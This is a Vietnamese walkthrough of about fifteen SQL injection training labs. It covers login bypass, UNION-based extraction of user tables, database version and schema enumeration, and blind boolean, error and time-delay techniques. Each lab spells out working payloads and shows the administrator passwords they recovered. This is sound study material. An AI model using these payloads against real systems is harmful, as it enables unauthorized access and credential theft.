**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

![alt text](images/1.png)

Đề bài cho biết trang web có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm ở mệnh đề WHERE. Mục tiêu của chúng ta là làm cho ứng dụng hiển thị tất cả các sản phẩm, bao gồm cả những sản phẩm chưa được phát hành (unreleased products).

Truy cập vào ứng dụng, câu truy vấn SQL ban đầu của hệ thống có dạng:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

![alt text](images/2.png)

Ta bắt request lọc sản phẩm theo `category`:

```sql
SELECT * FROM products WHERE category = 'input' AND released = 1;
```

![alt text](images/3.png)

Ta sửa tham số `category` thành payload: `' OR '1'='1'-- -`. Khi đó câu truy vấn phía máy chủ sẽ trở thành:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR '1'='1'-- -' AND released = 1;
```

Toàn bộ phần điều kiện `released = 1` phía sau bị loại bỏ do dấu comment `-- -`, và mệnh đề `OR '1'='1'` luôn đúng. 

![alt text](images/4.png)

Server trả về toàn bộ sản phẩm trong cơ sở dữ liệu. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: SQL injection vulnerability allowing login bypass**

![alt text](images/5.png)

Mục tiêu của bài lab này là vượt qua cơ chế xác thực đăng nhập để đăng nhập thành công vào tài khoản `administrator` bằng lỗ hổng SQL injection.

Truy cập vào trang đăng nhập của hệ thống.

![alt text](images/6.png)
![alt text](images/7.png)

Tại biểu mẫu đăng nhập, ta nhập vào trường username payload: `administrator'-- -` và mật khẩu tùy ý.

![alt text](images/8.png)

Câu lệnh kiểm tra tài khoản phía máy chủ bị cắt bỏ phần kiểm tra mật khẩu do dấu comment. Hệ thống xác thực thành công và đăng nhập trực tiếp vào tài khoản `administrator`.

![alt text](images/9.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: SQL injection UNION attack, determining the number of columns returned by the query**

![alt text](images/10.png)

Bài lab này yêu cầu sử dụng kỹ thuật SQL injection UNION attack trên bộ lọc danh mục sản phẩm để xác định chính xác số lượng cột mà câu truy vấn gốc trả về.

Bắt request gốc `GET /filter?category=Accessories` để làm mốc kiểm tra.

![alt text](images/11.png)

Khi ta thêm một dấu nháy đơn `'` vào tham số `category`, server trả về lỗi `500 Internal Server Error`, xác nhận câu truy vấn SQL bị lỗi cú pháp và tồn tại lỗ hổng SQLi.

![alt text](images/12.png)

Ta thêm ký tự comment `Accessories'--+`, server phản hồi `200 OK` bình thường trở lại.

![alt text](images/13.png)

Bây giờ ta bắt đầu đếm số cột bằng mệnh đề `ORDER BY`. Thử với `Accessories'+ORDER+BY+3--+`, trang web vẫn hiển thị kết quả bình thường. Điều này chứng tỏ truy vấn có ít nhất 3 cột.

![alt text](images/14.png)

Khi tăng lên `Accessories'+ORDER+BY+4--+`, server trả về lỗi 500. Như vậy câu truy vấn gốc chỉ có đúng 3 cột.

![alt text](images/15.png)

Để xác nhận lại và hoàn thành lab, ta chèn payload UNION với 3 giá trị NULL:
`Accessories'+UNION+SELECT+NULL,+NULL,+NULL-- -`

![alt text](images/16.png)

Server phản hồi 200 OK và hiển thị thông báo hoàn thành bài lab.

![alt text](images/17.png)

-----------------------------------------------------------------

**Lab: SQL injection UNION attack, finding a column containing text**

![alt text](images/18.png)

Sau khi xác định được số cột, bài lab này yêu cầu chúng ta tìm ra cột nào trong kết quả truy vấn có kiểu dữ liệu chuỗi (text/string) để có thể in ra giá trị ngẫu nhiên do đề bài cung cấp.

Bắt request gốc `GET /filter?category=Gifts`.

![alt text](images/19.png)

Thêm dấu `'` khiến server trả về 500, xác nhận điểm tiêm SQLi.

![alt text](images/20.png)

Thêm comment `'--` thì phản hồi trở lại 200 OK.

![alt text](images/21.png)

Đưa request sang Intruder để xác định số cột bằng `ORDER BY §1§--`.

![alt text](images/22.png)

Kết quả cho thấy từ 1 đến 3 trả về 200 OK, còn từ 4 trở lên trả về 500. Như vậy truy vấn có đúng 3 cột.

![alt text](images/23.png)

Bây giờ ta thử tìm cột hỗ trợ kiểu text bằng cách đặt chuỗi ký tự `'a'` lần lượt vào từng cột trong `UNION SELECT`.

![alt text](images/24.png)
![alt text](images/25.png)
![alt text](images/26.png)

Kết quả chỉ có payload `Gifts' UNION SELECT NULL, 'a', NULL--` trả về mã 200 OK. Điều này chứng tỏ cột thứ 2 là cột có kiểu dữ liệu văn bản.

![alt text](images/27.png)

Ta thay thế `'a'` bằng chuỗi ký tự ngẫu nhiên mà đề bài yêu cầu:
`Gifts' UNION SELECT NULL, 'oJq3rt', NULL-- -`

![alt text](images/28.png)

Chuỗi ký tự xuất hiện trên trang web và hệ thống ghi nhận hoàn thành bài lab.

![alt text](images/29.png)

-----------------------------------------------------------------

**Lab: SQL injection UNION attack to retrieve data from other tables**

![alt text](images/30.png)

Mục tiêu của bài lab là sử dụng SQL injection UNION attack để truy xuất bảng `users` chứa `username` và `password`, sau đó lấy mật khẩu của `administrator` để đăng nhập.

Bắt request lọc sản phẩm `GET /filter?category=Corporate+gifts`.

![alt text](images/31.png)

Thêm dấu `'` gây lỗi 500, xác nhận lỗi SQLi.

![alt text](images/32.png)

Thêm comment `'-- -` khôi phục phản hồi 200 OK.

![alt text](images/33.png)

Trong bài này mệnh đề `ORDER BY` bị chặn, ta chuyển sang đếm số cột trực tiếp bằng `UNION SELECT NULL, NULL...`.

![alt text](images/34.png)
![alt text](images/35.png)

Intruder kiểm tra số lượng NULL, chỉ có `UNION SELECT NULL, NULL--` trả về 200 OK. Vậy truy vấn có đúng 2 cột và cả hai cột đều hỗ trợ hiển thị chuỗi.

![alt text](images/36.png)

Bây giờ ta truy xuất trực tiếp bảng `users` bằng payload:
`Corporate gifts' UNION SELECT username, password FROM users--`

![alt text](images/37.png)

Thêm điều kiện `WHERE username='administrator'` để lấy thông tin của tài khoản quản trị:
`Corporate gifts' UNION SELECT username, password FROM users WHERE username='administrator'--`

![alt text](images/38.png)

Server trả về thông tin đăng nhập của `administrator`: `vo0asiqrq5762wjeeixq`.

![alt text](images/39.png)

Đăng nhập vào hệ thống với thông tin vừa tìm được để hoàn thành lab.

-----------------------------------------------------------------

**Lab: SQL injection UNION attack, retrieving multiple values in a single column**

![alt text](images/40.png)

Trong bài lab này, truy vấn chỉ có một cột duy nhất hỗ trợ kiểu dữ liệu chuỗi. Vì vậy ta cần sử dụng toán tử nối chuỗi để ghép cả `username` và `password` vào cùng một cột hiển thị.

Bắt request gốc `GET /filter?category=Pets`.

![alt text](images/41.png)

Thêm dấu `'` gây lỗi 500, xác nhận lỗ hổng.

![alt text](images/42.png)

Dùng comment `'--` đưa phản hồi về 200 OK.

![alt text](images/43.png)

Kiểm tra số cột bằng `UNION SELECT`: chỉ có 2 cột NULL trả về 200 OK.

![alt text](images/44.png)
![alt text](images/45.png)

Tiến hành kiểm tra kiểu dữ liệu từng cột. Cột 1 trả về lỗi, trong khi cột 2 với payload `UNION SELECT NULL, 'a'--` trả về 200 OK. Vậy chỉ có cột thứ 2 nhận dữ liệu chuỗi.

![alt text](images/46.png)
![alt text](images/47.png)

Ta dùng toán tử nối chuỗi `||` để ghép hai trường dữ liệu lại với nhau:
`Pets' UNION SELECT NULL, username || '~~' || password FROM users WHERE username='administrator'--`

![alt text](images/48.png)

Kết quả trả về trên trang hiển thị rõ ràng: `administrator~~xkzdcjb297erzm54`. Đăng nhập vào tài khoản `administrator` để giải quyết bài lab.

-----------------------------------------------------------------

**Lab: SQL injection attack, querying the database type and version on Oracle**

![alt text](images/49.png)

Mục tiêu của bài này là truy vấn loại và phiên bản của cơ sở dữ liệu Oracle thông qua lỗ hổng SQL injection.

Bắt request kiểm tra danh mục sản phẩm.

![alt text](images/50.png)

Thêm dấu `'` gây lỗi 500, xác nhận điểm tiêm.

![alt text](images/51.png)

Đóng truy vấn bằng `'--` trả về 200 OK.

![alt text](images/52.png)

Khi thử `UNION SELECT NULL--` thì bị lỗi 500 do đặc thù của Oracle yêu cầu mọi câu lệnh SELECT đều phải có mệnh đề FROM (dùng bảng `dual`).

![alt text](images/53.png)
![alt text](images/54.png)
![alt text](images/55.png)

Dùng Intruder thử với cú pháp Oracle: `UNION SELECT NULL, NULL FROM dual--`, ta xác định được truy vấn có 2 cột.

![alt text](images/56.png)

Kiểm tra kiểu dữ liệu với `UNION SELECT 'a', NULL FROM dual--`, kết quả trả về 200 OK. Cột đầu tiên hỗ trợ chuỗi.

![alt text](images/57.png)

Trên cơ sở dữ liệu Oracle, bảng `v$version` chứa thông tin phiên bản. Ta tạo payload:
`Tech gifts' UNION SELECT banner, NULL FROM v$version--`

![alt text](images/58.png)
![alt text](images/59.png)
![alt text](images/60.png)

Thông tin phiên bản Oracle Database hiển thị trực tiếp trên giao diện sản phẩm.

![alt text](images/61.png)
![alt text](images/62.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

![alt text](images/63.png)

Bài lab yêu cầu hiển thị chuỗi phiên bản của cơ sở dữ liệu MySQL hoặc Microsoft SQL Server.

Bắt request `GET /filter?category=Pets`.

![alt text](images/64.png)

Thêm `'` gây lỗi 500, thêm `'--` (hoặc comment của MySQL `#` / `-- `) khôi phục 200 OK.

![alt text](images/65.png)
![alt text](images/66.png)

Xác định số cột bằng `UNION SELECT NULL, NULL--`, kết quả có 2 cột.

![alt text](images/67.png)
![alt text](images/68.png)

Kiểm tra thấy cột 1 nhận kiểu dữ liệu văn bản.

![alt text](images/69.png)

Trên MySQL và MSSQL, biến hệ thống `@@version` chứa thông tin phiên bản cơ sở dữ liệu. Ta sử dụng payload:
`Pets' UNION SELECT @@version, NULL-- -`

![alt text](images/70.png)

Chuỗi phiên bản cơ sở dữ liệu MySQL xuất hiện trên trang web: `8.0.42-0ubuntu0.20.04.1`.

![alt text](images/71.png)
![alt text](images/72.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: SQL injection attack, listing the database contents on non-Oracle databases**

![alt text](images/73.png)

Mục tiêu của bài là khai thác cơ sở dữ liệu (PostgreSQL/MySQL) để duyệt danh sách các bảng và cột trong `information_schema`, sau đó trích xuất tài khoản của `administrator`.

Bắt request `category=Tech+gifts`.

![alt text](images/74.png)

Thêm `'` gây lỗi 500, thêm `'--` khôi phục 200 OK.

![alt text](images/75.png)
![alt text](images/76.png)

Kiểm tra số cột: truy vấn có 2 cột và cả hai cột đều hỗ trợ hiển thị chuỗi.

![alt text](images/77.png)
![alt text](images/78.png)

Gọi hàm `version()` xác nhận cơ sở dữ liệu là PostgreSQL.

![alt text](images/79.png)

Truy vấn bảng `information_schema.tables` để tìm bảng chứa người dùng:
`Tech gifts' UNION SELECT table_name, NULL FROM information_schema.tables--`

Ta tìm thấy bảng có tên `users_owmglg`.

![alt text](images/80.png)
![alt text](images/81.png)

Tiếp tục truy vấn `information_schema.columns` để tìm các cột trong bảng `users_owmglg`:
`Tech gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_owmglg'--`

Ta thu được hai cột là `username_vjwgvd` và `password_ftkuwy`.

![alt text](images/82.png)
![alt text](images/83.png)
![alt text](images/84.png)

Bây giờ ta truy xuất dữ liệu từ bảng mục tiêu:
`Tech gifts' UNION SELECT username_vjwgvd, password_ftkuwy FROM users_owmglg--`

![alt text](images/85.png)

Trang web hiển thị danh sách tài khoản, trong đó có `administrator / 7dqmik6ldxdj88ers6e3`.

![alt text](images/86.png)

Đăng nhập vào tài khoản `administrator` để hoàn thành lab.

![alt text](images/87.png)

-----------------------------------------------------------------

**Lab: SQL injection attack, listing the database contents on Oracle databases**

![alt text](images/88.png)

Tương tự bài trước nhưng trên hệ quản trị cơ sở dữ liệu Oracle, ta cần sử dụng các bảng từ điển dữ liệu của Oracle như `all_tables` và `all_tab_columns` để tìm bảng và cột chứa thông tin đăng nhập.

Bắt request `category=Gifts`.

![alt text](images/89.png)

Thêm `'--` để ổn định câu truy vấn.

![alt text](images/90.png)

Xác định số lượng cột bằng cú pháp Oracle: `UNION SELECT NULL, NULL FROM dual--`, kết quả truy vấn có 2 cột.

![alt text](images/91.png)
![alt text](images/92.png)

Kiểm tra kiểu dữ liệu cột 1 hỗ trợ chuỗi.

![alt text](images/93.png)

Truy vấn danh sách bảng từ `all_tables`:
`Gifts' UNION SELECT table_name, NULL FROM all_tables--`

Ta tìm được bảng người dùng có tên `USERS_SHRPGH`.

![alt text](images/94.png)
![alt text](images/95.png)

Tiếp tục truy vấn tên cột từ `all_tab_columns`:
`Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_SHRPGH'--`

Thu được hai cột: `USERNAME_ELXDSO` và `PASSWORD_WRWDUL`.

![alt text](images/96.png)
![alt text](images/97.png)

Trích xuất thông tin tài khoản và mật khẩu:
`Gifts' UNION SELECT USERNAME_ELXDSO, PASSWORD_WRWDUL FROM USERS_SHRPGH--`

![alt text](images/98.png)

Lấy được thông tin tài khoản `administrator`: `wnb0hmqj5iaoh30y3yka`.

![alt text](images/99.png)

Đăng nhập vào hệ thống để hoàn thành bài lab.

![alt text](images/100.png)

-----------------------------------------------------------------

**Lab: Blind SQL injection with conditional responses**

![alt text](images/101.png)

Bài lab này có lỗ hổng Blind SQL injection nằm trong cookie `TrackingId`. Ứng dụng không hiển thị kết quả truy vấn SQL nhưng phản hồi trên trang sẽ xuất hiện dòng chữ "Welcome back!" nếu câu truy vấn trả về dữ liệu hợp lệ. Ta sẽ dựa vào tín hiệu này để suy luận từng ký tự mật khẩu của `administrator`.

Gửi request bình thường với cookie `TrackingId`.

![alt text](images/102.png)
![alt text](images/103.png)
![alt text](images/104.png)

Khi `TrackingId` hợp lệ, trang có thông báo "Welcome back!".

![alt text](images/105.png)

Khi thêm dấu `'` vào cookie, câu SQL bị lỗi cú pháp và thông báo "Welcome back!" biến mất.

![alt text](images/106.png)

Thêm comment `'+--` thì thông báo "Welcome back!" xuất hiện trở lại. Điều này xác nhận ta đã kiểm soát được truy vấn qua cookie.

![alt text](images/107.png)

Kiểm tra tính năng bằng điều kiện Boolean đúng/sai:
`TrackingId=xyz' AND '1'='1` -> Có "Welcome back!"
`TrackingId=xyz' AND '1'='2` -> Mất "Welcome back!"

![alt text](images/108.png)
![alt text](images/109.png)

Kiểm tra độ dài mật khẩu bằng Intruder với payload:
`' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§--`

Kết quả tại vị trí độ dài bằng 20 xuất hiện thông báo "Welcome back!". Vậy mật khẩu dài 20 ký tự.

![alt text](images/110.png)

Tiếp tục brute-force trích xuất từng ký tự bằng hàm `SUBSTRING`:
`' AND (SELECT SUBSTRING(password, §1§, 1) FROM users WHERE username='administrator')='§a§'--`

![alt text](images/111.png)

Ghép các ký tự tìm được lại, ta có mật khẩu hoàn chỉnh của `administrator`.

![alt text](images/112.png)

Đăng nhập vào hệ thống để hoàn thành lab.

![alt text](images/113.png)

-----------------------------------------------------------------

**Lab: Blind SQL injection with conditional errors**

![alt text](images/114.png)

Trong bài này, ứng dụng không thay đổi nội dung trang web khi truy vấn đúng hay sai, nhưng ta có thể cố tình kích hoạt lỗi cơ sở dữ liệu (ví dụ chia cho 0) khi một điều kiện thỏa mãn để nhận biết qua phản hồi 500 Internal Server Error.

Bắt request kiểm tra cookie `TrackingId`.

![alt text](images/115.png)

Thêm `'` vào `TrackingId` khiến server báo lỗi 500, thêm `'--` thì server trả về 200 OK. Hệ thống sử dụng cơ sở dữ liệu Oracle.

![alt text](images/116.png)
![alt text](images/117.png)

Ta xây dựng biểu thức điều kiện kích hoạt lỗi trên Oracle:
`' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a`
- Khi điều kiện đúng: `1/0` gây lỗi chia cho không -> Server trả về 500.
- Khi điều kiện sai: Trả về `'a'` -> Server trả về 200 OK bình thường.

![alt text](images/118.png)

Dùng Intruder kiểm tra độ dài mật khẩu của `administrator`:
`' AND (SELECT CASE WHEN (LENGTH(password)=§1§) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`

Tại vị trí 20, server trả về mã lỗi 500. Mật khẩu có độ dài 20 ký tự.

![alt text](images/119.png)

Dùng kiểu tấn công Cluster Bomb trong Intruder để kiểm tra từng ký tự bằng hàm `SUBSTR`:
`' AND (SELECT CASE WHEN (SUBSTR(password, §1§, 1)='§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`

![alt text](images/120.png)
![alt text](images/121.png)

Lọc các request trả về mã lỗi 500, ta thu được đầy đủ chuỗi mật khẩu của `administrator`.

![alt text](images/122.png)

Đăng nhập vào tài khoản để hoàn thành lab.

-----------------------------------------------------------------

**Lab: Visible error-based SQL injection**

![alt text](images/123.png)

Bài lab này cho phép khai thác kỹ thuật Error-based SQL injection khi thông báo lỗi của cơ sở dữ liệu hiển thị chi tiết trên trang web, qua đó làm rò rỉ trực tiếp dữ liệu mật khẩu.

Bắt request có cookie `TrackingId`.

![alt text](images/124.png)

Khi chèn dấu `'`, ứng dụng in ra thông báo lỗi chi tiết của PostgreSQL: "Unterminated string literal... Expected char".

![alt text](images/125.png)

Thêm comment `'--` đưa phản hồi về 200 OK.

![alt text](images/126.png)

Ta thử ép kiểu dữ liệu chuỗi sang số nguyên bằng hàm `CAST`:
`' AND 1=CAST((SELECT 1) AS int)--` -> Trả về 200 OK.

![alt text](images/127.png)

Khi ta ép kiểu một chuỗi ký tự sang số nguyên:
`' AND 1=CAST((SELECT 'test') AS int)--`

Server báo lỗi: "invalid input syntax for type integer: 'test'". Chuỗi bên trong câu lệnh SELECT được in trực tiếp vào thông báo lỗi.

![alt text](images/128.png)
![alt text](images/129.png)

Ta đưa câu truy vấn lấy mật khẩu của người dùng vào hàm `CAST`:
`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

Nếu gặp lỗi giới hạn độ dài ký tự của `TrackingId`, ta xóa bớt giá trị cũ của cookie để chèn payload gọn hơn.

![alt text](images/130.png)

Server trả về thông báo lỗi chứa chính xác mật khẩu của `administrator`:
`invalid input syntax for type integer: 'z75anh0ybng4v5woecq1'`

![alt text](images/131.png)

Lấy mật khẩu vừa hiển thị để đăng nhập vào tài khoản `administrator` và hoàn thành lab.

-----------------------------------------------------------------

**Lab: Blind SQL injection with time delays**

![alt text](images/132.png)

Đề bài yêu cầu chứng minh sự tồn tại của lỗ hổng Blind SQL injection trong cookie `TrackingId` bằng cách làm cho máy chủ phản hồi trễ 10 giây.

Bắt request có chứa cookie `TrackingId`. Trên cơ sở dữ liệu PostgreSQL, ta sử dụng hàm `pg_sleep(10)` để tạo độ trễ.

![alt text](images/133.png)

Ta chèn payload vào cookie:
`TrackingId=x'%3BSELECT+pg_sleep(10)--`

Server mất đúng 10 giây mới phản hồi kết quả về cho client.

![alt text](images/134.png)

Xác nhận thành công độ trễ thời gian. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Blind SQL injection with time delays and information retrieval**

![alt text](images/135.png)

Trong bài này, ngoài việc tạo độ trễ, ta cần kết hợp biểu thức điều kiện để trích xuất mật khẩu của tài khoản `administrator` dựa trên thời gian phản hồi của máy chủ.

Bắt request có cookie `TrackingId`.

![alt text](images/136.png)

Thử nghiệm câu lệnh điều kiện tạo độ trễ:
`TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

Khi điều kiện đúng (1=1), server trễ 10 giây. Khi điều kiện sai (1=2), server phản hồi ngay lập tức.

![alt text](images/137.png)
![alt text](images/138.png)

Kiểm tra độ dài mật khẩu của `administrator` bằng payload:
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Server phản hồi sau 10 giây, xác nhận mật khẩu dài 20 ký tự.

![alt text](images/139.png)

Sử dụng Intruder để brute-force từng ký tự mật khẩu:
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

![alt text](images/140.png)

Theo dõi cột phản hồi thời gian (Response completed), những request mất hơn 10.000 ms chính là ký tự đúng.

![alt text](images/141.png)

Sau khi thu được toàn bộ 20 ký tự mật khẩu của `administrator`.

![alt text](images/142.png)

Ta đăng nhập vào tài khoản `administrator` để giải quyết bài lab.

![alt text](images/143.png)

Vậy là hoàn thành bài lab này.

